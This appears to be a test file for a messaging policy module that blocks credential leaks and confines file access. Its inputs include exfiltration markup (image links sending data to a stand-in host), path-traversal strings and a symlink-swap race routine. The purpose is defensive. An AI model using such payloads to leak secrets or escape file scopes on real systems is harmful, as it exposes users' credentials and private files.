import { describe, expect, it } from "vitest";
import { inspectImOutbound, requireImScope } from "../src/main/im-policy.js";
import {
  authorizeImPath,
  readImFile,
  writeImFile,
} from "../src/main/im-policy.js";
import {
  mkdtemp,
  mkdir,
  writeFile,
  readFile,
  link,
  symlink,
  rm,
  rename,
  unlink,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

describe("IM policy", () => {
  it("fails closed on legacy grants", () => {
    expect(() => requireImScope({} as never, "owner")).toThrow(/确认/u);
  });
  it("allows discussion and placeholders", () => {
    expect(
      inspectImOutbound(
        'Discuss password validation. const token = "test-token"; API_KEY=your-api-key',
      ),
    ).toBeUndefined();
  });
  it.each([
    "-----BEGIN PRIVATE KEY-----\nsecret",
    "Authorization: Bearer " + "a".repeat(30),
    "api_key=sk-" + "a".repeat(30),
    "![chart](https://example.test/collect?data=secret)",
    '<img src="https://example.test/collect">',
    "[report](https://example.test/?token=realcredentialvalue)",
  ])("holds credentials and exfiltration markup", (text) => {
    expect(inspectImOutbound(text)).toBeDefined();
  });
  it("checks invisible characters without altering the original", () => {
    expect(
      inspectImOutbound("Author\u200bization: Bearer " + "a".repeat(30)),
    ).toBeDefined();
  });
  it("does not expand a file grant when its path becomes a directory", () => {
    expect(() =>
      authorizeImPath(
        {
          audience: "owner",
          readPaths: ["readme"],
          writePaths: [],
          filePaths: ["readme"],
        },
        "readme/private.txt",
      ),
    ).toThrow(/文件/);
  });
  it("enforces one file scope for reads, writes and publication bytes", async () => {
    const root = await mkdtemp(join(tmpdir(), "im-file-policy-"));
    const scope = {
      audience: "owner",
      readPaths: ["src", "docs"],
      writePaths: ["src"],
    };
    try {
      await mkdir(join(root, "src"));
      await mkdir(join(root, "docs"));
      await writeFile(join(root, "private.txt"), "PRIVATE_SENTINEL");
      await writeFile(join(root, "src", ".env"), "PROTECTED_SENTINEL");
      await writeFile(join(root, "docs", "guide.txt"), "read only");
      await symlink(join(root, "private.txt"), join(root, "src", "symbol.txt"));
      await link(join(root, "private.txt"), join(root, "src", "hard.txt"));
      for (const path of [
        "../private.txt",
        "private.txt",
        "src/.env",
        "src/symbol.txt",
        "src/hard.txt",
        "src/../private.txt",
        "src\\private.txt",
      ])
        await expect(readImFile(root, path, scope)).rejects.toThrow();
      for (const path of [
        "docs/guide.txt",
        "src/.env",
        "src/hard.txt",
        "src/symbol.txt",
      ])
        await expect(
          writeImFile(root, path, "overwrite", scope),
        ).rejects.toThrow();
      if (process.platform !== "darwin")
        await writeFile(join(root, "src", "new.txt"), "");
      await writeImFile(root, "src/new.txt", "accepted", scope);
      const frozen = await readImFile(root, "src/new.txt", scope);
      await writeFile(join(root, "src", "new.txt"), "replacement");
      expect(frozen.toString()).toBe("accepted");
      expect(await readFile(join(root, "private.txt"), "utf8")).toBe(
        "PRIVATE_SENTINEL",
      );
      await expect(readImFile(root, "src/new.txt", scope, 2)).rejects.toThrow(
        /limit/,
      );
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  });
  it.runIf(process.platform === "darwin")(
    "does not follow an ancestor replaced during file access",
    async () => {
      const root = await mkdtemp(join(tmpdir(), "im-path-race-"));
      const workspace = join(root, "project");
      const outside = join(root, "outside");
      const source = join(workspace, "src");
      const held = join(workspace, "held");
      const scope = {
        audience: "owner",
        readPaths: ["src"],
        writePaths: ["src"],
      };
      try {
        await mkdir(source, { recursive: true });
        await mkdir(outside);
        await writeFile(join(source, "existing.txt"), "ALLOWED");
        await writeFile(join(outside, "existing.txt"), "PRIVATE_SENTINEL");
        const attacker = async () => {
          for (let i = 0; i < 100; i++) {
            await rename(source, held);
            await symlink(outside, source);
            await new Promise<void>((done) => setImmediate(done));
            await unlink(source);
            await rename(held, source);
          }
        };
        const access = async () => {
          for (let i = 0; i < 100; i++) {
            const bytes = await readImFile(
              workspace,
              "src/existing.txt",
              scope,
            ).catch(() => undefined);
            if (bytes)
              expect(["ALLOWED", "UPDATED"]).toContain(bytes.toString());
            await writeImFile(
              workspace,
              "src/existing.txt",
              "UPDATED",
              scope,
            ).catch(() => {});
            await writeImFile(workspace, "src/new.txt", "NEW", scope).catch(
              () => {},
            );
          }
        };
        await Promise.all([attacker(), access()]);
        expect(await readFile(join(outside, "existing.txt"), "utf8")).toBe(
          "PRIVATE_SENTINEL",
        );
        await expect(readFile(join(outside, "new.txt"))).rejects.toMatchObject({
          code: "ENOENT",
        });
      } finally {
        await rm(root, { recursive: true, force: true });
      }
    },
  );
});
